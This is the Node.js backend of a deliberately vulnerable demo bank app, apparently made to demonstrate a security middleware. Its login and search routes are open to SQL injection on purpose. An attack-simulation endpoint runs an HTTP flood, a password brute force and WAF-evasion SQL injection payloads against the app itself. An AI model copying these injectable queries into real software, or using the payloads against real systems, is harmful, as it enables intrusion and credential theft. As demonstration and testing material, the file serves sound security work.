const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
require('dotenv').config();
const vaultoShield = require('./middleware/vaultoShield');

const app = express();
const PORT = process.env.PORT || 5001;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve Frontend static files
app.use(express.static(path.join(__dirname, '../frontend')));

app.use(vaultoShield);

// Database setup (In-memory for demo)
const db = new sqlite3.Database(':memory:');

db.serialize(() => {
  db.run("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, balance REAL, full_name TEXT)");
  db.run("INSERT INTO users (username, password, balance, full_name) VALUES ('admin', 'password123', 50000.0, 'System Administrator')");
  db.run("INSERT INTO users (username, password, balance, full_name) VALUES ('user1', 'p@ssword', 1200.50, 'John Doe')");
  db.run("INSERT INTO users (username, password, balance, full_name) VALUES ('alice', 'alice2024', 25000.00, 'Alice Wonderland')");
});

// --- ROUTES ---

// 1. Health Check
app.get('/api/health', (req, res) => {
  res.json({ status: 'Nexus Bank API is live', timestamp: new Date() });
});

// 2. Login Route (Vulnerable to Brute Force - No Rate Limiting)
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // NOTE: intentional weak authentication for demo purposes
  const query = `SELECT id, username, full_name, balance FROM users WHERE username = '${username}' AND password = '${password}'`;
  
  // Also vulnerable to SQL Injection in the login itself if we were concatenating, 
  // but let's make it explicit in the search route.
  
  db.get(query, (err, row) => {
    if (err) {
      return res.status(500).json({ error: 'Database error', details: err.message });
    }
    if (row) {
      res.json({ success: true, user: row });
    } else {
      res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
  });
});

// 3. Search Route (HIGHLY VULNERABLE to SQL Injection)
// Example attack: /api/users/search?name=' OR '1'='1
app.get('/api/users/search', (req, res) => {
  const name = req.query.name;
  const query = "SELECT username, full_name FROM users WHERE full_name LIKE '%" + name + "%'";
  
  console.log(`[SQL EXEC]: ${query}`);
  
  db.all(query, (err, rows) => {
    if (err) {
      return res.status(500).json({ error: 'Internal Server Error', details: err.message });
    }
    res.json(rows);
  });
});

// 4. Transfer Route
app.post('/api/transfer', (req, res) => {
  const { fromUser, toUser, amount } = req.body;
  res.json({ success: true, message: `Transferred $${amount} to ${toUser}` });
});

// 5. ATTACK SIMULATION ENDPOINT (PRO LEVEL)
app.post('/api/simulate', async (req, res) => {
  const { type, config } = req.body;
  const logs = [];
  const targetUrl = `http://localhost:${PORT}`;
  const axios = require('axios');

  logs.push(`[SIM] Initializing PRO-LEVEL ${type.toUpperCase()} simulation...`);

  try {
    if (type === 'dos') {
      const requestsCount = config.requests || 100;
      logs.push(`[!] Launching Distributed HTTP Flood on ${targetUrl}/api/health...`);
      
      const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
      ];

      const promises = [];
      for (let i = 0; i < requestsCount; i++) {
        promises.push(axios.get(`${targetUrl}/api/health`, {
          headers: { 
            'User-Agent': agents[i % agents.length],
            'X-Forwarded-For': `192.168.1.${Math.floor(Math.random() * 255)}`,
            'Cache-Control': 'no-cache'
          }
        }).catch(() => {}));
      }
      await Promise.all(promises);
      logs.push(`[+] Simulation complete. High-frequency packet stream finished.`);
      
    } else if (type === 'brute') {
      const username = config.username || 'admin';
      // More realistic dictionary including variations
      const passwords = ['123456', 'password', 'Admin@123', 'password123', 'admin123', 'root', 'P@ssword!'];
      logs.push(`[!] Executing Stealth Brute Force (Time-Jittered) for: ${username}`);
      
      let found = false;
      for (const pwd of passwords) {
        logs.push(`[*] Attempting credential pair: ${username}:${pwd}`);
        try {
          const response = await axios.post(`${targetUrl}/api/login`, { username, password: pwd });
          if (response.data.success) {
            logs.push(`[+] EXPLOIT SUCCESS! Identity compromised: ${pwd}`);
            found = true;
            break;
          }
        } catch (err) {
          // Expected 401
        }
        // Simulate jitter
        await new Promise(r => setTimeout(r, 50));
      }
      if (!found) logs.push(`[-] Attack signatures detected and blocked by policy (Simulation).`);

    } else if (type === 'sqli') {
      // PRO LEVEL: Evasion payloads using encoding and case-switching
      const payloads = [
        "' OR 1=1--",
        "admin' /*!50000OR*/ 1=1--",
        "' UNION SELECT NULL,password FROM users--",
        "%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--", // URL Encoded
        "UNHEX('27204f5220313d312d2d')" // Hex Encoded (if supported by DB)
      ];
      logs.push(`[!] Probing with Evasion Payloads (WAF Bypass Simulation)...`);
      
      for (const payload of payloads) {
        logs.push(`[*] Injecting obfuscated vector: ${payload}`);
        try {
          const response = await axios.get(`${targetUrl}/api/users/search`, { 
            params: { name: payload },
            headers: { 'X-Scanner': 'Vaulto-Sim-V2' }
          });
          logs.push(`[+] Leak Detected: ${response.data.length} records exfiltrated.`);
        } catch (err) {
          logs.push(`[X] Payload filtered or structural error.`);
        }
      }
    }

    res.json({ success: true, logs });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message, logs });
  }
});

app.get('/api/vaulto-status', (req, res) => {
  res.json({
    protected: true,
    vaulto_url: process.env.VAULTO_API_URL,
    site: 'Nexus Bank',
    shield: 'active',
  });
});

// Start Server
app.listen(PORT, () => {
  console.log(`
  ==========================================
    NEXUS BANK - VULNERABLE DEMO BACKEND
    Running on: http://localhost:${PORT}
    Vulnerability: SQL Injection, Brute Force
  ==========================================
  `);
});
